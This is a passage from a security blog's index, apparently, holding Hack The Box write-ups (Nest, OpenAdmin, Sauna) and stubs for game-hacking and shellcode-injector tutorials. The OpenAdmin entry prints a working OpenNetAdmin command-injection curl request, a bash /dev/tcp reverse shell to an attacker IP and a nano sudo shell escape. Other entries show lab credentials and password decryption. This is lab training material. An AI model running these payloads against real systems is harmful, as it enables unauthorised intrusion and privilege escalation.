tutorials Checkout official Guided Hacking Youtube channel Project Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET References Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] Internal Trainer"},{"categories":null,"contents":"Shellcodecode Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Part 1 Part 2 Part 3 Part 4 Part 5 ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/shellcode-injector/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/shellcode-injector/","summary":"Shellcodecode Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Part 1 Part 2 Part 3 Part 4 Part 5 ","tags":["Guided Hacking"],"title":"[Guided Hacking] Shellcodecode Injector"},{"categories":null,"contents":"Nest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.178 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 19:24 BST Nmap scan report for 10.10.10.178 (10.10.10.178) Host is up (0.10s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4386-TCP:V=7.93%I=7%D=7/4%Time=64A463FC%P=x86_64-pc-linux-gnu%r(NUL SF:L,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(GenericLine SF:s,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised SF:\\x20command\\r\\n\u0026gt;\u0026#34;)%r(GetRequest,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20 SF:V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20command\\r\\n\u0026gt;\u0026#34;)%r(HTTPOptions,3A,\u0026#34;\\r\\n SF:HQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20comman SF:d\\r\\n\u0026gt;\u0026#34;)%r(RTSPRequest,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n SF:\\r\\n\u0026gt;\\r\\nUnrecognised\\x20command\\r\\n\u0026gt;\u0026#34;)%r(RPCCheck,21,\u0026#34;\\r\\nHQK\\x20Repor SF:ting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(DNSVersionBindReqTCP,21,\u0026#34;\\r\\nHQK\\ SF:x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(DNSStatusRequestTCP,21,\u0026#34;\\ SF:r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(Help,F2,\u0026#34;\\r\\nHQK\\x SF:20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nThis\\x20service\\x20allows\\x SF:20users\\x20to\\x20run\\x20queries\\x20against\\x20databases\\x20using\\x20the SF:\\x20legacy\\x20HQK\\x20format\\r\\n\\r\\n---\\x20AVAILABLE\\x20COMMANDS\\x20---\\ SF:r\\n\\r\\nLIST\\r\\nSETDIR\\x20\u0026lt;Directory_Name\u0026gt;\\r\\nRUNQUERY\\x20\u0026lt;Query_ID\u0026gt;\\r\\n SF:DEBUG\\x20\u0026lt;Password\u0026gt;\\r\\nHELP\\x20\u0026lt;Command\u0026gt;\\r\\n\u0026gt;\u0026#34;)%r(SSLSessionReq,21,\u0026#34;\\r\\ SF:nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(TerminalServerCookie SF:,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(TLSSessionRe SF:q,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(Kerberos,21 SF:,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(SMBProgNeg,21,\u0026#34; SF:\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(X11Probe,21,\u0026#34;\\r\\n SF:HQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(FourOhFourRequest,3A, SF:\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20c SF:ommand\\r\\n\u0026gt;\u0026#34;)%r(LPDString,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\ SF:r\\n\\r\\n\u0026gt;\u0026#34;)%r(LDAPSearchReq,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2 SF:\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(LDAPBindReq,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\ SF:r\\n\\r\\n\u0026gt;\u0026#34;)%r(SIPOptions,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\ SF:n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20command\\r\\n\u0026gt;\u0026#34;)%r(LANDesk-RC,21,\u0026#34;\\r\\nHQK\\x20Re SF:porting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(TerminalServer,21,\u0026#34;\\r\\nHQK\\x20 SF:Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;); Host script results: |_clock-skew: -32s | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-07-04T18:27:07 |_ start_date: 2023-07-04T18:17:55 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 203.70 seconds smb Let\u0026rsquo;s download txt files and check them We got creds Let\u0026rsquo;s also check another open port We see a HQK reporting service running We can input help command to see the list of available commands The only interesting thing found is Debug command, but it requires password Foothold Let\u0026rsquo;s try using the creds found in smb └─$ smbmap -H 10.10.10.178 -R -u \u0026#39;TempUser\u0026#39; -p \u0026#39;welcome2019\u0026#39; [+] IP: 10.10.10.178:445 Name: 10.10.10.178 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share Data READ ONLY .\\Data\\* dr--r--r-- 0 Wed Aug 7 23:53:46 2019 . dr--r--r-- 0 Wed Aug 7 23:53:46 2019 .. dr--r--r-- 0 Wed Aug 7 23:58:07 2019 IT dr--r--r-- 0 Mon Aug 5 22:53:41 2019 Production dr--r--r-- 0 Mon Aug 5 22:53:50 2019 Reports dr--r--r-- 0 Wed Aug 7 20:07:51 2019 Shared .\\Data\\IT\\* dr--r--r-- 0 Wed Aug 7 23:58:07 2019 . dr--r--r-- 0 Wed Aug 7 23:58:07 2019 .. dr--r--r-- 0 Wed Aug 7 23:58:07 2019 Archive dr--r--r-- 0 Wed Aug 7 23:59:34 2019 Configs dr--r--r-- 0 Wed Aug 7 23:08:30 2019 Installs dr--r--r-- 0 Wed Jul 21 19:47:16 2021 Reports dr--r--r-- 0 Mon Aug 5 23:33:51 2019 Tools .\\Data\\IT\\Configs\\* dr--r--r-- 0 Wed Aug 7 23:59:34 2019 . dr--r--r-- 0 Wed Aug 7 23:59:34 2019 .. dr--r--r-- 0 Wed Jul 21 19:47:13 2021 Adobe dr--r--r-- 0 Wed Jul 21 19:47:04 2021 Atlas dr--r--r-- 0 Tue Aug 6 14:27:08 2019 DLink dr--r--r-- 0 Wed Aug 7 20:23:26 2019 Microsoft dr--r--r-- 0 Wed Jul 21 19:47:13 2021 NotepadPlusPlus dr--r--r-- 0 Wed Jul 21 19:47:05 2021 RU Scanner dr--r--r-- 0 Tue Aug 6 14:27:09 2019 Server Manager .\\Data\\IT\\Configs\\Adobe\\* dr--r--r-- 0 Wed Jul 21 19:47:13 2021 . dr--r--r-- 0 Wed Jul 21 19:47:13 2021 .. fr--r--r-- 246 Wed Jul 21 19:47:12 2021 editing.xml fr--r--r-- 0 Wed Aug 7 20:20:09 2019 Options.txt fr--r--r-- 258 Wed Aug 7 20:20:09 2019 projects.xml fr--r--r-- 1274 Wed Aug 7 20:20:09 2019 settings.xml .\\Data\\IT\\Configs\\Atlas\\* dr--r--r-- 0 Wed Jul 21 19:47:04 2021 . dr--r--r-- 0 Wed Jul 21 19:47:04 2021 .. fr--r--r-- 1369 Wed Jul 21 19:47:04 2021 Temp.XML .\\Data\\IT\\Configs\\Microsoft\\* dr--r--r-- 0 Wed Aug 7 20:23:26 2019 . dr--r--r-- 0 Wed Aug 7 20:23:26 2019 .. fr--r--r-- 4598 Wed Aug 7 20:23:26 2019 Options.xml .\\Data\\IT\\Configs\\NotepadPlusPlus\\* dr--r--r-- 0 Wed Jul 21 19:47:13 2021 . dr--r--r-- 0 Wed Jul 21 19:47:13 2021 .. fr--r--r-- 6451 Wed Jul 21 19:47:13 2021 config.xml fr--r--r-- 2108 Wed Jul 21 19:47:15 2021 shortcuts.xml .\\Data\\IT\\Configs\\RU Scanner\\* dr--r--r-- 0 Wed Jul 21 19:47:05 2021 . dr--r--r-- 0 Wed Jul 21 19:47:05 2021 .. fr--r--r-- 270 Wed Jul 21 19:47:14 2021 RU_config.xml .\\Data\\Shared\\* dr--r--r-- 0 Wed Aug 7 20:07:51 2019 . dr--r--r-- 0 Wed Aug 7 20:07:51 2019 .. dr--r--r-- 0 Wed Jul 21 19:47:12 2021 Maintenance dr--r--r-- 0 Wed Jul 21 19:47:12 2021 Templates .\\Data\\Shared\\Maintenance\\* dr--r--r-- 0 Wed Jul 21 19:47:12 2021 . dr--r--r-- 0 Wed Jul 21 19:47:12 2021 .. fr--r--r-- 48 Wed Jul 21 19:47:05 2021 Maintenance Alerts.txt .\\Data\\Shared\\Templates\\* dr--r--r-- 0 Wed Jul 21 19:47:12 2021 . dr--r--r-- 0 Wed Jul 21 19:47:12 2021 .. dr--r--r-- 0 Wed Jul 21 19:47:12 2021 HR dr--r--r-- 0 Wed Aug 7 20:08:07 2019 Marketing .\\Data\\Shared\\Templates\\HR\\* dr--r--r-- 0 Wed Jul 21 19:47:12 2021 . dr--r--r-- 0 Wed Jul 21 19:47:12 2021 .. fr--r--r-- 425 Wed Jul 21 19:47:12 2021 Welcome Email.txt IPC$ NO ACCESS Remote IPC Secure$ READ ONLY .\\Secure$\\* dr--r--r-- 0 Thu Aug 8 00:08:12 2019 . dr--r--r-- 0 Thu Aug 8 00:08:12 2019 .. dr--r--r-- 0 Wed Aug 7 20:40:25 2019 Finance dr--r--r-- 0 Thu Aug 8 00:08:12 2019 HR dr--r--r-- 0 Thu Aug 8 11:59:25 2019 IT Users READ ONLY .\\Users\\* dr--r--r-- 0 Sat Jan 25 23:04:21 2020 . dr--r--r-- 0 Sat Jan 25 23:04:21 2020 .. dr--r--r-- 0 Wed Jul 21 19:47:04 2021 Administrator dr--r--r-- 0 Wed Jul 21 19:47:04 2021 C.Smith dr--r--r-- 0 Thu Aug 8 18:03:29 2019 L.Frost dr--r--r-- 0 Thu Aug 8 18:02:56 2019 R.Thompson dr--r--r-- 0 Wed Jul 21 19:47:15 2021 TempUser .\\Users\\TempUser\\* dr--r--r-- 0 Wed Jul 21 19:47:15 2021 . dr--r--r-- 0 Wed Jul 21 19:47:15 2021 .. fr--r--r-- 0 Wed Jul 21 19:47:15 2021 New Text Document.txt Let\u0026rsquo;s download the files and check them Search for password word in files resulted in encrypted password for c.smith c.smith:fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE= The password looks encrypted You will also find Notepad++ config in IT/Configs/NotepadPlusPlus/config.xml It has an interesting parameters set pointing to Secure$\\IT\\Carl Let\u0026rsquo;s try to visit the path Let\u0026rsquo;s download the content In VB Projects folder I found an interesting file Module1.vb1 Which opens RU_Config.xml and decrypts the password Since we have sln project I will open it in Visual Studio The build was successful, but execution throws an exception since it can\u0026rsquo;t find the config file So I uploaded the config file next to the binary and executed it Don\u0026rsquo;t forget to add a breakpoint so we can retrieve the password c.smith:xRxRxPANCAK3SxRxRx We can\u0026rsquo;t launch shell, but we can get our flag Root We found HQK Reporting folder inside C.Smith\u0026rsquo;s directory I downloaded whole directory and found Debug Mode Password.txt file, but it was empty Then I checked other files, but found nothing Checked password file on smb using allinfo and found an alternative data stream The password was stored there WBQ201953D8w Now we can access debug menu in HQK Now we can read files with SHOWQUERY Found a config file with encrypted password for Administrator And executable file HqKLdap.exe which I saw previously in C.Smith\u0026rsquo;s directory Let\u0026rsquo;s debug it Open executable using dnSpy If we check main function we see that it performs several checks We can create fake file just to pass the check Set the breakpoint for ldap module and start debugging by supplying ldap.conf that we saw in HQK service Administrator:XtH4nkS4Pl4y1nGX Rooted ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/nest/images/nest.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/nest/","summary":"Nest Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.178 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 19:24 BST Nmap scan report for 10.10.10.178 (10.10.10.178) Host is up (0.10s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.","tags":["HTB","dnspy","visual-studio","smb","alternative-data-streams"],"title":"[HTB] Machine: Nest"},{"categories":null,"contents":"OpenAdmin Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.171 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:39 BST Nmap scan report for 10.10.10.171 (10.10.10.171) Host is up (0.19s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA) | 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA) |_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.34 seconds gobuster └─$ gobuster dir -u http://10.10.10.171 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt,php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.171 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2023/06/27 17:52:42 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 277] /.php (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 10918] /music (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.171/music/] /artwork (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.171/artwork/] /sierra (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.171/sierra/] /.php (Status: 403) [Size: 277] /.html (Status: 403) [Size: 277] Web server /ona\nIf you click login on /music page, it will redirect you to /ona page\nFoothold searchsploit Check exploit We can test it manually curl -s -d \u0026quot;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;id\u0026amp;xajaxargs[]=ping\u0026quot; http://10.10.10.171/ona/ Let\u0026rsquo;s try reverse shell curl -s -d \u0026quot;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;bash -c 'bash -i \u0026gt;%26 /dev/tcp/10.10.16.7/6666 0\u0026gt;%261'\u0026amp;xajaxargs[]=ping\u0026quot; http://10.10.10.171/ona/ User 1 Enumerating for privesc Started from local directory grep -inRE \u0026quot;*passwd*\u0026quot; . to search for config files with password Open mysql Before cracking let\u0026rsquo;s try su for password reuse with n1nj4W4rri0R! And it works for jimmy User 2 We see a folder owned by jimmy We see the source files Let\u0026rsquo;s check open ports Strange port 52846 And if apache or nginx was running (ona was hosted by apache) internal.openadmin.htb on port 52846 Let\u0026rsquo;s configure port forwarding via SSH Webshell We can create webshell php file and access it Let\u0026rsquo;s get reverse shell SSH If we read source code of internal we can see that after login we will get a joanna\u0026rsquo;s key And the creds for access are hardcoded I tried connecting with the key, but it was encrypted So I used john to find a passphrase bloodninjas Root Started with checking sudo rights GTFOBins Steps: sudo /bin/nano /opt/priv CTRL + R CTRL + X reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 Rooted ","date":"June 26, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/openadmin/images/openadmin.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/openadmin/","summary":"OpenAdmin Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.171 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:39 BST Nmap scan report for 10.10.10.171 (10.10.10.171) Host is up (0.19s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b98df85d17ef03dda48cdbc9200b754 (RSA) | 256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA) |_ 256 dcadca3c11315b6fe6a489347c9be550 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","opennetadmin","searchsploit","webshell","ssh","john","sudo","gtfobins"],"title":"[HTB] Machine: OpenAdmin"},{"categories":null,"contents":"Sauna Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.175 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-28 17:36 BST Nmap scan report for 10.10.10.175 (10.10.10.175) Host is up (0.11s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-28 23:35:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m29s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-06-28T23:36:05 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.94 seconds gobuster └─$ gobuster dir -u http://10.10.10.175 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.175 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: aspx,asp [+] Timeout: 10s =============================================================== 2023/06/28 18:47:01 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.175/images/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.175/Images/] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.175/css/] /fonts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.175/fonts/] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.175/IMAGES/] /Fonts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.10.175/Fonts/] /CSS (Status: 301) [Size: 147] [--\u0026gt; http://10.10.10.175/CSS/] smbclient found nothing └─$ smbclient -N -L //10.10.10.175 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available Web server ldapsearch └─$ ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -x -H ldap://10.10.10.175 -b \u0026#39;DC=EGOTISTICAL-BANK,DC=LOCAL\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;DC=EGOTISTICAL-BANK,DC=LOCAL\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # EGOTISTICAL-BANK.LOCAL dn: DC=EGOTISTICAL-BANK,DC=LOCAL objectClass: top objectClass: domain objectClass: domainDNS distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL instanceType: 5 whenCreated: 20200123054425.0Z whenChanged: 20230628233031.0Z subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL uSNCreated: 4099 dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A== uSNChanged: 98336 name: EGOTISTICAL-BANK objectGUID:: 7AZOUMEioUOTwM9IB/gzYw== replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJZTr RoDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA== creationTime: 133324686314808354 forceLogoff: -9223372036854775808 lockoutDuration: -18000000000 lockOutObservationWindow: -18000000000 lockoutThreshold: 0 maxPwdAge: -36288000000000 minPwdAge: -864000000000 minPwdLength: 7 modifiedCountAtLastProm: 0 nextRid: 1000 pwdProperties: 1 pwdHistoryLength: 24 objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG serverState: 1 uASCompat: 1 modifiedCount: 1 auditingPolicy:: AAE= nTMixedDomain: 0 rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL systemFlags: -1946157056 wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT ISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra m Data,DC=EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO TISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin cipals,DC=EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC= EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E GOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO TISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC AL-BANK,DC=LOCAL wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers, DC=EGOTISTICAL-BANK,DC=LOCAL wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS TICAL-BANK,DC=LOCAL wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA L-BANK,DC=LOCAL objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D C=LOCAL isCriticalSystemObject: TRUE gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste m,DC=EGOTISTICAL-BANK,DC=LOCAL;0] dSCorePropagationData: 16010101000000.0Z otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS TICAL-BANK,DC=LOCAL otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL ms-DS-MachineAccountQuota: 10 msDS-Behavior-Version: 7 msDS-PerUserTrustQuota: 1 msDS-AllUsersTrustQuota: 1000 msDS-PerUserTrustTombstonesQuota: 10 msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL msDS-NcType: 0 msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE dc: EGOTISTICAL-BANK # Users, EGOTISTICAL-BANK.LOCAL dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL # Computers, EGOTISTICAL-BANK.LOCAL dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL # Domain Controllers, EGOTISTICAL-BANK.LOCAL dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL # System, EGOTISTICAL-BANK.LOCAL dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL # LostAndFound, EGOTISTICAL-BANK.LOCAL dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL # Infrastructure, EGOTISTICAL-BANK.LOCAL dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL # ForeignSecurityPrincipals, 